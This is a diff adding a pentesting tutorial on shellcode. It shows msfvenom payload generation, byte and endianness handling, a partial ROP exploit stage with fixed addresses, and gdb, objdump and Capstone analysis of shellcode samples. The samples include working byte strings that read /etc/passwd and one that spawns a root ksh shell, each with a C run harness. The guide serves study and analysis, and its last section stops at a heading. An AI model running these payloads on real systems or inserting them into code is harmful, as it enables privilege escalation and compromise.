@@ -1,0 +1,564 @@
+.. include:: /pentest_links.txt
+
+
+*********
+Shellcode
+*********
+
+Background
+==========
+
+What is shellcode?
+------------------
+
+Learning about shellcode is a basic requirement for pentesters, but it's not used much anymore as indicated by the shellcode repository `Shellcodes database for study cases`_:
+
+  Although now the shellcodes are rarely used, this page lists some shellcodes for study cases and proposes an API to search a specific shellcode. Thanks all for the contribution of this database but we have stop to accept shellcodes because modern exploitation uses now ROP payloads.
+
+What is shellcode? From `Wikipedia Shellcode`_:
+
+  In computer security, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode.
+
+See `How Shellcodes Work`_ for a useful introduction to how shellcode can differ from normal assembly code. See `packetstorm shellcode papers`_ and `packetstorm shellcode`_ for articles.
+
+Intel vs. AT&T instruction syntax
+---------------------------------
+
+To read assembly you'll have to know whether you're reading Intel or AT&T instruction syntax. From `Wikipedia x86 assembly language Syntax <https://en.wikipedia.org/wiki/X86_assembly_language#Syntax>`_:
+
+  x86 assembly language has two main syntax branches: Intel syntax, originally used for documentation of the x86 platform, and AT&T syntax. Intel syntax is dominant in the MS-DOS and Windows world, and AT&T syntax is dominant in the Unix world, since Unix was created at AT&T Bell Labs.
+
+Here is an example of setting register eax to 5:
+
+.. code-block:: objdump
+
+  ; AT&T syntax
+  mov $5, %eax
+
+  ; Intel syntax
+  mov eax, 5
+
+:program:`gcc` can use Intel syntax via "-masm=intel", :program:`gdb` via "set disassembly-flavor intel".
+
+32 vs 64 bit
+------------
+
+32-bit and 64-bit assembly differs, starting with the processor registers. See `An Introduction to x86_64 Assembly Language <http://hackeradam17.com/2014/03/18/an-introduction-to-x86_64-assembly-language/>`_ for a quick read that describes some of the differences between 32-bit and 64-bit architectures.
+
+Here are some more links, some of which extend far beyond what a normal pentester could be expected to know.
+
+* `X86 Opcode and Instruction Reference <http://ref.x86asm.net/>`_
+
+* `sandpile.org <http://sandpile.org/>`_
+
+* `flat assembler <http://flatassembler.net/>`_
+
+* `x86 Assembly <https://en.wikibooks.org/wiki/X86_Assembly>`_
+
+* `Intel® 64 and IA-32 Architectures Software Developer Manuals <http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html>`_
+
+* `Developer Guides, Manuals & ISA Documents <http://developer.amd.com/resources/documentation-articles/developer-guides-manuals/>`_
+
+Endianness
+----------
+
+`Endianness <https://en.wikipedia.org/wiki/Endianness>`_ "refers to the order of the bytes, comprising a digital word, in computer memory. ... Intel x86 processors use little-endian." Take the hex value 0x12345678: the little-endian representation as consecutive bytes would be 0x78, 0x56, 0x34, then 0x12. Remember that shellcode is often input as a string, so byte order is important.
+
+
+Generating shellcode
+====================
+
+Manually code
+-------------
+
+Of course since shellcode is code you can just manually develop the code, though that is out-of-scope here.
+
+Canned shellcode
+----------------
+
+There are a number of sites having canned shellcode and you can search for more:
+
+`Shellcodes database for study cases`_
+  Although now the shellcodes are rarely used, this page lists some shellcodes for study cases and proposes an API to search a specific shellcode. Thanks all for the contribution of this database but we have stop to accept shellcodes because modern exploitation uses now ROP payloads.
+
+`Exploit Database Shellcode`_
+  Archived shellcode for various operating systems and architectures.
+
+Metasploit
+----------
+
+Metasploit can be used to generate shellcode, both via :program:`msfconsole` (using "generate") and :program:`msfvenom`. Here we focus on :program:`msfvenom`, though :program:`msfconsole` is needed to determine payload options. There are several new changes regarding Metasploit in Kali 2.0:
+
+* Kali 2.0 includes a version of Metasploit Framework.
+
+  Metasploit Community / Pro is no longer installed by default. See `Now Officially Supporting Kali Linux 2.0 <https://community.rapid7.com/community/metasploit/blog/2015/10/20/kali-2-new-operating-systems-support>`_ for more information.
+
+* :program:`msfvenom` is replacing :program:`msfpayload` and :program:`msfencode`:
+
+  From `How to use msfvenom`_: "Msfvenom is the combination of payload generation and encoding. It will replace msfpayload and msfencode on June 8th 2015." And from ``man msfvenom``: "Msfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. Msfvenom has replaced both msfpayload and msfencode as of June 8th, 2015."
+
+Here is an example of generating shellcode using the Metasploit Framework's :program:`msfvenom`. See `How to use msfvenom <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>`_ for more information. For using :program:`msfconsole` exclusively see `‘Generate’ a payload for Metasploit <https://www.offensive-security.com/metasploit-unleashed/generating-payloads/>`_. For an alternate approach see gotm1lk's `mpc.sh <https://github.com/g0tmi1k/mpc/blob/master/mpc.sh>`_.
+
+
+.. code-block:: bash
+  :emphasize-lines: 1-8,14-21,26-32
+
+  # Generating payloads using msfvenom and msfconsole.
+  # Metasploit Framework is installed in /usr/share/framework2
+  PATH=$PATH:/usr/share/framework2
+  # To see available payloads, encoders, formats, platforms:
+  msfvenom --list payloads
+  msfvenom --list encoders
+  msfvenom --help-formats
+  msfvenom --help-platforms
+  # For our example we decide on:
+  #   payload = linux/x86/exec
+  #   encoder = x86/shikata_ga_nai
+  #   platform = linux
+  # NOTE: if specify "--bad-chars" then get encoder even without "--encoder".
+  # To see payload variables/options, fire up msfconsole to show the payload options:
+  sudo systemctl start postgresql
+  sudo msfdb init
+  cat <<EOF | sudo msfconsole -r -
+  use payload/linux/x86/exec
+  show options
+  quit
+  EOF
+  # This shows we need to set CMD="command string to execute".
+  # We choose a very simple CMD, merely "echo hello > /tmp/hello".
+  # Use "ls -al" afterwards to show that the CMD ran.
+
+  # Here's the code to generate a python payload:
+  msfvenom --payload linux/x86/exec CMD='echo hello > /tmp/hello' \
+           --encoder x86/shikata_ga_nai \
+           --bad-chars "\x00\x0a\x0d" \
+           --platform linux --arch x86 \
+           --format python \
+           --out shellcode.py
+
+  # Same shellcode without encoding (has null characters in it).
+  msfvenom --payload linux/x86/exec CMD='echo hello > /tmp/hello' \
+           --platform linux --arch x86 \
+           --format python \
+           --out shellcode_nulls.py
+  # This time as raw bytes.
+  msfvenom --payload linux/x86/exec CMD='echo hello > /tmp/hello' \
+           --platform linux --arch x86 \
+           --format raw \
+           --out shellcode_nulls.raw
+
+There are a number of :program:`msfvenom` options for more advanced shellcode generation:
+
+.. code-block:: console
+  :emphasize-lines: 1,10,17-23,25-
+
+  hacker@kali:~$ msfvenom --help
+  Error: MsfVenom - a Metasploit standalone payload generator.
+  Also a replacement for msfpayload and msfencode.
+  Usage: /usr/bin/msfvenom [options] <var=val>
+
+  Options:
+      -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
+          --payload-options            List the payload's standard options
+      -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
+      -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
+      -f, --format        <format>     Output format (use --help-formats for a list)
+          --help-formats               List available formats
+      -e, --encoder       <encoder>    The encoder to use
+      -a, --arch          <arch>       The architecture to use
+          --platform      <platform>   The platform of the payload
+          --help-platforms             List available platforms
+      -s, --space         <length>     The maximum size of the resulting payload
+          --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
+      -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
+      -i, --iterations    <count>      The number of times to encode the payload
+      -c, --add-code      <path>       Specify an additional win32 shellcode file to include
+      -x, --template      <path>       Specify a custom executable file to use as a template
+      -k, --keep                       Preserve the template behavior and inject the payload as a new thread
+      -o, --out           <path>       Save the payload
+      -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
+          --smallest                   Generate the smallest possible payload
+      -h, --help                       Show this message
+
+
+Manipulating shellcode
+======================
+
+Make python code to work in 2 and 3 both
+----------------------------------------
+
+See `Python 3 in Python 2.6+ <http://www.dwheeler.com/essays/python3-in-python2.html>`_. When possible, python should be coded so that the same code can be run & work in both python 2 and 3. So when building up shellcode in python use a bytearray and immediately convert strings to bytes/bytearray. Here goes how to deal with strings, bytes, and little-endian addresses. (See `What else you need to know - bytes & str <http://python-future.org/what_else.html#what-else>`_ for alternative approaches.)
+
+.. code-block:: python
+
+  cat <<"EOF" > p2or3.py
+  import struct
+  import sys
+  shellcode = bytearray()
+  shellcode.extend(bytearray("/bin/bash","UTF-8"))       # adding strings
+  shellcode.extend(b" \x31\x32\x33\x34\x35")             # adding bytes
+  shellcode.extend(struct.pack('<L',0x89abcdef))         # adding 32 bit address
+  shellcode.extend(struct.pack('<Q',0x89abcdef01020304)) # adding 64 bit address
+  output = getattr(sys.stdout, 'buffer', sys.stdout)     # sys.stdout.buffer (3), sys.stdout (2)
+  output.write(shellcode)
+  EOF
+  python2 p2or3.py | xxd -ps
+  python3 p2or3.py | xxd -ps
+  # both output 2f62696e2f62617368203132333435efcdab8904030201efcdab89
+
+Python 2 & 3 treat string & bytes differently. In python 3 a string object is a sequence of characters in some encoding similar to python 2's unicode object. In python 3 a bytes object is a sequence of bytes, with conversion required to mix with string. Strings in python 2 are really a bytearray so can be mixed with bytes. Python 2 allows ``shellbytes = bytearray("some string")`` but python 3 requires ``shellbytes = bytearray("some string", "UTF-8")`` (note the required string encoding). The best way to deal with this difference is to deal with bytes/bytearray and not strings. After all, shellcode eventually becomes bytes.
+
+Note that a string like "89abcdef" is 8 characters long while "\\x89\\xab\\xcd\\xef" interprets "\\xHH" as a hex value representing 1 character leaving "\\x89\\xab\\xcd\\xef" as 4 characters.
+
+Little-endian addresses
+-----------------------
+
+To illustrate little-endian encoding of addresses, here is part of a ROP-based exploit that defines function :program:`p` using :program:`struct.pack` to ease conversion of memory addresses to a little-endian sequence of bytes. The 2-stage exploit starts off with stage 1 having a call to :program:`scanf` to read the next exploit stage into fixed memory location 0x0804aa24, which :program:`p` converts to \\x24\\xaa\\x04\\x08:
+
+.. code-block:: python
+  :emphasize-lines: 1,3-5,7-8,14-
+
+  import struct
+
+  # return address in little-endian format
+  def p(addr):
+      return struct.pack('<l', addr)
+
+  # address to load stage 2
+  stage2addr = 0x0804aa24
+
+  # create stage 1
+  exploit = bytearray()
+  exploit.extend(b"X"*267)       # filler
+  # add addresses for scanf call, gadget to pop 2 scanf arguments, then 2 scanf arguments
+  exploit.extend(p(0x080483bc))  # scanf address
+  exploit.extend(p(0x08048462))  # address of gadget 0x8048462L: pop ebx ; pop ebp ;;
+  exploit.extend(p(0x08048707))  # address of string "%s"
+  exploit.extend(p(stage2addr))  # address where to read in next buffer
+  exploit.extend(b"\x00")        # null byte to terminate stage 1
+  # create stage 2
+  # exploit.extend(...)
+  # ...
+  exploit.extend(b"\x00")        # null byte to terminate stage 2
+
+Shellcode hex string to binary file & back
+------------------------------------------
+
+Shellcode is often provided/generated as a string looking something like "\x31\xdb\xb0\x01\xcd\x80". Here we illustrate :program:`bash` commands to convert the string to a file containing the raw shellcode and back again.
+
+.. code-block:: bash
+
+  SHELLCODE="\x31\xdb\xb0\x01\xcd\x80"
+  HEX="shellcode.hex"
+  echo -n "$SHELLCODE" > $HEX
+  RAW="shellcode.raw"
+
+  # SHELLCODE HEX to RAW
+  # tr to remove \x, xxd for hexdump
+  cat $HEX | tr -d '\\\x' | xxd -r -p > $RAW
+  xxd -p $RAW
+
+  # SHELLCODE RAW to HEX
+  cat $RAW | xxd -p | sed -e 's/\(..\)/\\x\1/g' > $HEX
+  cat $HEX
+
+Next we illustrate :program:`python` transforming bytes/bytearray data to strings of various formats and back:
+
+.. code-block:: python
+
+  cat <<"EOF" > conversions.py
+  import binascii
+
+  # Here's the raw bytes
+  shellcode = bytearray()
+  shellcode.extend(b"\x31\xdb\xb0\x01\xcd\x80")
+
+  # Convert to hex string "31dbb001cd80"
+  hex = binascii.hexlify(shellcode)
+  if not isinstance(hex, str):
+    hex = str(hex, 'ascii')
+  # and to reverse this back to bytes
+  shellcode_from_hex = binascii.unhexlify(hex)
+
+  # Add colons to get "31:db:b0:01:cd:80"
+  hexcolon = ':'.join(hex[i:i+2] for i in range(0, len(hex), 2))
+  # and to reverse this back to bytes
+  shellcode_from_hexcolon = binascii.unhexlify(hexcolon.replace(":",""))
+
+  # Add \x to get "\x31\xdb\xb0\x01\xcd\x80"
+  hexed = '\\x' + "\\x".join(hex[i:i+2] for i in range(0, len(hex), 2))
+  # and to reverse this back to bytes
+  shellcode_from_hexed = binascii.unhexlify(hexed.replace("\\x",""))
+
+  # Show the results
+  print(hex)
+  print(hexcolon)
+  print(hexed)
+  EOF
+
+  # Show this runs in both python 2 & 3
+  python2 conversions.py
+  python2 conversions.py
+
+
+Reverse engineering shellcode
+=============================
+
+This is not a general introduction to reverse engineering; for a look at general reverse engineering tools consider looking `Tools Installed on REMnux <https://remnux.org/docs/distro/tools/>`_ or other distributions dedicated to reverse engineering.
+
+Here we take a limited look at simply reverse engineering shellcode to determine if the code does what it claims to do. That is especially difficult when the code has some form of encoding (which is the idea behind encoding). There are 2 approaches:
+
+* Convert shellcode to assembly code then read it.
+
+* Run the shellcode using a debugger setting the appropriate breakpoints to inspect code prior to execution.
+
+Linux reverse engineering shellcode
+-----------------------------------
+
+`shellnoob`_ for shellcode
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+:program:`shellnoob` does not generate shellcode but is useful tool to convert between shellcode formats; interactive asm-to-opcode conversion; resolve syscall numbers, constants, and error numbers; debug using "--to-strace" and "--to-gdb". Here are some simple examples:
+
+.. code-block:: bash
+
+  # Get raw shellcode in a file.
+  SHELLCODE="\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"
+  echo -n "$SHELLCODE" | tr -d '\\\x' | xxd -r -p > shellcode.bin
+  # Disassemble
+  shellnoob --from-bin $PWD/shellcode.bin --intel --to-asm $PWD/shellcode.asm
+  cat shellcode.asm
+  # "int 80" uses 0xb argument - is that execve?
+  shellnoob --get-sysnum execve
+
+
+
+
+
+:program:`objdump`, `Capstone`_, and :program:`ndisasm`  to disassemble shellcode
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+A simple disassembler can be used on simple (non-encoded, non-staged) shellcode, followed by code inspection. We follow the recipe above to get the raw shellcode into a file, then run :program:`objdump`:
+
+.. code-block:: bash
+
+  # Get raw shellcode in a file.
+  SHELLCODE="\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"
+  echo -n "$SHELLCODE" > shellcode.hex
+  cat shellcode.hex | tr -d '\\\x' | xxd -r -p > shellcode.raw
+  # Disassemble
+  objdump -b binary -m i386 -D shellcode.raw
+
+Here is an example following `Python tutorial for Capstone <http://www.capstone-engine.org/lang_python.html>`_ to disassemble shellcode:
+
+.. code-block:: bash
+
+  cat <<"EOF" >disassem.py
+  # disassem
+  from capstone import *
+
+  SHELLCODE = b"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"
+
+  md = Cs(CS_ARCH_X86, CS_MODE_64)
+  for i in md.disasm(SHELLCODE, 0x1000):
+      print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
+  EOF
+
+  python disassem.py
+
+Proceed as in the case of using :program:`objdump`.
+
+Here is an example using `NASM`_'s :program:`ndisasm` to disassemble shellcode:
+
+.. code-block:: bash
+
+  # Get raw shellcode in a file.
+  SHELLCODE="\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"
+  echo -n "$SHELLCODE" > shellcode.hex
+  cat shellcode.hex | tr -d '\\\x' | xxd -r -p > shellcode.raw
+  # Disassemble
+  nasm -b 32 shellcode.raw
+
+Proceed as in the case of using :program:`objdump`.
+
+:program:`gdb` to disassemble shellcode
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Here we reproduce 3 examples of disassembly. `Linux x86 Reverse Engineering <https://dl.packetstormsecurity.net/papers/shellcode/re_shellcode.pdf>`_ contains 2 Linux shellcode examples: (1) simple program that runs ``/bin/cat /etc//passwd``; (2) XOR-encrypted shellcode that launches a new :program:`ksh` shell running as root. `Assignment 5.1: MSF shellcode analysis linux/x86/shell/reverse_tcp <https://nasmland645.wordpress.com/2015/02/08/assignment-5-1-msf-shellcode-analysis-linuxx86shellreverse_tcp/>`_ walks us through disassembling the standard metasploit linux/x86/shell/reverse_tcp staged payload.
+
+`Linux x86 Reverse Engineering <https://dl.packetstormsecurity.net/papers/shellcode/re_shellcode.pdf>`_ Example 1
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+First create a C program containing the shellcode purportedly running ``/bin/cat /etc//passwd``.
+
+.. code-block:: bash
+
+  # NOTE - this compiles as a 32-bit executable.
+  # Example 1 C code.
+  cat <<"EOF" > code.c
+  #include <stdio.h>
+  #include <string.h>
+  unsigned char code[] = \
+  "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
+
+  main()
+  {
+      printf("Shellcode Length: %d\n", strlen(code));
+      int (*ret)() = (int(*)())code;
+      ret();
+  }
+  EOF
+
+  # Compile, link as 32-bit.
+  gcc -m32 -fno-stack-protector -z execstack code.c -o shellcode
+  chmod +x shellcode
+
+Now you could exclusively use :program:`objdump` to disassemble the shellcode. The code is in the .data section of the shellcode ELF file, so ``objdump -D -j .data shellcode`` will disassemble:
+
+.. code-block:: bash
+
+  hacker@kali:~$ objdump -M intel -D -j .data shellcode
+
+  shellcode:     file format elf32-i386
+
+
+  Disassembly of section .data:
+
+  08049740 <__data_start>:
+   8049740:	00 00                	add    BYTE PTR [eax],al
+	  ...
+
+  08049744 <__dso_handle>:
+	  ...
+
+  08049760 <code>:
+   8049760:	31 c0                	xor    eax,eax
+   8049762:	99                   	cdq    
+   8049763:	52                   	push   edx
+   8049764:	68 2f 63 61 74       	push   0x7461632f
+   8049769:	68 2f 62 69 6e       	push   0x6e69622f
+   804976e:	89 e3                	mov    ebx,esp
+   8049770:	52                   	push   edx
+   8049771:	68 73 73 77 64       	push   0x64777373
+   8049776:	68 2f 2f 70 61       	push   0x61702f2f
+   804977b:	68 2f 65 74 63       	push   0x6374652f
+   8049780:	89 e1                	mov    ecx,esp
+   8049782:	b0 0b                	mov    al,0xb
+   8049784:	52                   	push   edx
+   8049785:	51                   	push   ecx
+   8049786:	53                   	push   ebx
+   8049787:	89 e1                	mov    ecx,esp
+   8049789:	cd 80                	int    0x80
+	  ...
+
+Physically inspecting the assembler could lead to knowning what the code does. But that can get difficult in general. Instead, use :program:`gdb` to run the code and disassemble. After starting ``gdb shellcode``, set a breakpoint where the shellcode resides ("break \*&code"), then "run". When the breakpoint is reached, "disassemble" shows the instruction ``int 0x80``. Set another breakpoint there ("break 0x08049789", but this may be different for you), then "continue" execution to reach that breakpoint. At this point the registers and memory can be examined to determine that the system call is ``execve`` for ``/bin/cat /etc//passwd``.
+
+.. code-block:: bash
+
+  # NOTE - your breakpoint values for gdb will likely differ.
+  # Create file of gdb inputs for batch run.
+  cat > gdb.in <<"EOF"
+  set disassembly-flavor intel
+  # Set breakpoint at <code>, then run.
+  break *&code
+  run
+  # Disassemble and read, determining the next breakpoint is the int instruction.
+  disassemble
+  # Adjust the breakpoint to the address of the int instruction, then continue.
+  break *0x08049789
+  continue
+  # See that the int argument is 11 = "execve"
+  print $eax
+  print /x $ebx
+  # See execve arguments are "/bin/cat /etc//passwd".
+  x/s $ebx
+  x/16 $ecx
+  quit
+  EOF
+
+  # Batch gdb execution.
+  # However, your first gdb run should be manual, cut-and-paste of the gdb.in file.
+  # This is because your breakpoint address will likely be different.
+  gdb --batch --command=gdb.in ./shellcode
+
+  # Run the actual shellcode to verify it prints out /etc/passwd.
+  ./shellcode
+
+Note how :program:`gdb` can replace laborious manual code simulation.
+
+`Linux x86 Reverse Engineering <https://dl.packetstormsecurity.net/papers/shellcode/re_shellcode.pdf>`_ Example 2
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+This example is more complex in that the code is xor-encoded, so manually reading :program:`objdump` listing is difficult at best. As above, create a C program containing shellcode, but skip the :program:`objdump` listing and proceed directly to :program:`gdb`.
+
+.. code-block:: bash
+
+  # NOTE - this compiles as a 32-bit executable.
+  # Example 2 C code.
+  cat <<"EOF" > code.c
+  #include <stdio.h>
+  #include <string.h>
+  unsigned char code[] = \
+  "\xeb\x0d\x5e\x31\xc9\xb1\x21\x80\x36\x7c\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x16\x3a\x24\x4d\xa7\x4d\xb5\xb1\xfc\x4d\xae\x16\x77\x24\x2e\x14\x53\x17\x0f\x14\x14\x53\x1e\x15\x12\xf5\x9f\x2e\x2f\xf5\x9d\xb1\xfc";
+
+  main()
+  {
+      printf("Shellcode Length: %d\n", strlen(code));
+      int (*ret)() = (int(*)())code;
+      ret();
+  }
+  EOF
+
+  # Compile, link as 32-bit.
+  gcc -m32 -fno-stack-protector -z execstack code.c -o shellcode
+  chmod +x shellcode
+
+Now start :program:`gdb` to start analyzing the shellcode. You'll quickly see that the code xor-decodes itself, meaning you'll have to set breakpoints before & after the decoding to see the decoded shellcode. Then additional breakpoints can be added to inspect the 2 ``int 0x80`` instructions.
+
+.. code-block:: bash
+
+  # Create file of gdb inputs for batch run.
+  cat > gdb.in <<"EOF"
+  set disassembly-flavor intel
+  # Set breakpoint at <code>, then run.
+  break *&code
+  run
+  # Disassemble and read, determining the next breakpoint is the jump instruction.
+  disassemble
+  break *0x0804976d
+  continue
+  # Disassemble and read, determining the next breakpoint is the next int instruction.
+  disassemble
+  break *0x0804977b
+  continue
+  # See that the int argument is 0x46 = "setreuid" with arguments 0,0 (root)
+  print $eax
+  print $ebx
+  print $ecx
+  # Disassemble and read, determining the next breakpoint is the next int instruction.
+  disassemble
+  break *0x08049793
+  continue
+  # See that the int argument is 11 = "execve" running "/bin/ksh".
+  print $eax
+  print $ebx
+  x/s $ebx
+  print $ecx
+  x/s $ecx
+  quit
+  EOF
+
+  # Batch gdb execution.
+  # However, your first gdb run should be manual, cut-and-paste of the gdb.in file.
+  # This is because your breakpoint address will likely be different.
+  gdb --batch --command=gdb.in ./shellcode
+
+  # Don't run the actual shellcode as it will spawn a root shell.
+  # ./shellcode
+
+`Assignment 5.1: MSF shellcode analysis linux/x86/shell/reverse_tcp <https://nasmland645.wordpress.com/2015/02/08/assignment-5-1-msf-shellcode-analysis-linuxx86shellreverse_tcp/>`_ Example 3
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+
+
+
